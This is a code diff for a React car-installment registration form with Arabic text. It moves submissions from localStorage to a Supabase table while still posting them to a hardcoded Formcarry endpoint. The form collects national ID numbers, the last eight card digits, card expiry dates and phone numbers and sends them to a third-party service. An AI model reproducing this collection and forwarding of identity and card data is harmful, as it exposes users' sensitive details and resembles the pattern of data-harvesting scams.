@@ -2,6 +2,7 @@
 
 import { useState } from "react"
 import { Car, cars, formatPrice } from "@/lib/data"
+import { createClient } from "@/lib/supabase/client"
 import { User, CreditCard, CheckCircle, ChevronLeft, ChevronRight } from "lucide-react"
 
 interface RegistrationFormProps {
@@ -41,16 +42,31 @@ export function RegistrationForm({ selectedCar, onSelectCar }: RegistrationFormP
   const handleSubmit = async () => {
     setIsLoading(true)
     
-    const registration = {
-      ...formData,
-      selectedCarId: selectedCar?.id,
-      createdAt: new Date().toISOString(),
-      status: "pending",
-    }
+    const supabase = createClient()
     
     try {
-      // Send directly to Formcarry
-      const response = await fetch("https://formcarry.com/s/ZXsyzAQSlEQ", {
+      // Save to Supabase
+      const { error: supabaseError } = await supabase
+        .from('registrations')
+        .insert({
+          full_name: formData.fullName,
+          nin: formData.nin,
+          card_last8: formData.cardLast8,
+          card_expiry: formData.cardExpiry,
+          phone1: formData.phone1,
+          phone2: formData.phone2 || null,
+          has_previous_installment: formData.hasPreviousInstallment,
+          selected_car_id: selectedCar?.id,
+          status: 'pending',
+        })
+      
+      if (supabaseError) {
+        console.error("[v0] Supabase error:", supabaseError)
+        throw supabaseError
+      }
+      
+      // Also send to Formcarry for email notifications
+      await fetch("https://formcarry.com/s/ZXsyzAQSlEQ", {
         method: "POST",
         headers: { 
           "Content-Type": "application/json",
@@ -69,22 +85,16 @@ export function RegistrationForm({ selectedCar, onSelectCar }: RegistrationFormP
           monthlyPayment: selectedCar ? `${selectedCar.monthlyPayment} دج/شهر` : "",
           registrationDate: new Date().toLocaleString("ar-DZ"),
         }),
-      })
+      }).catch(err => console.error("[v0] Formcarry error:", err))
       
-      const result = await response.json()
-      console.log("[v0] Formcarry result:", result)
+      setIsSubmitted(true)
+      setStep(3)
     } catch (error) {
-      console.error("[v0] Error sending to Formcarry:", error)
+      console.error("[v0] Registration error:", error)
+      alert("حدث خطأ أثناء التسجيل. يرجى المحاولة مرة أخرى.")
+    } finally {
+      setIsLoading(false)
     }
-    
-    // Store in localStorage for dashboard
-    const registrations = JSON.parse(localStorage.getItem("registrations") || "[]")
-    registrations.push({ ...registration, id: Date.now().toString() })
-    localStorage.setItem("registrations", JSON.stringify(registrations))
-    
-    setIsLoading(false)
-    setIsSubmitted(true)
-    setStep(3)
   }
 
   const steps = [
